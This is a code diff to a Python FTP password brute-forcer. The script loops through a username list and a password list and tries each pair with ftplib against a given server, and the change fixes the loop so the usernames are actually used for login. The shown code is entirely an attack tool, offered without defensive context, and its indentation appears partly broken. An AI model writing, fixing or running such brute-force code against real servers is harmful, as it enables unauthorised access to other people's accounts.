@@ -11,8 +11,8 @@ Passwordlist = input ("Path to Password List > ")
 try:
 
 	with open(user, 'r') as ur:
-		for word in ur:
-			word = word.strip ('\r').strip('\n')
+		for drow in ur:
+			drow = drow.strip ('\r').strip('\n')
 			try:
 
 				with open(Passwordlist, 'r') as pw:
@@ -20,7 +20,7 @@ try:
 						word = word.strip ('\r').strip('\n')
 						try:
 							ftp = ftplib.FTP(server)
-							ftp.login(user, word)
+							ftp.login(drow, word)
 							print('Success! The password is ' + word)
 						except:
 					print('still trying…')
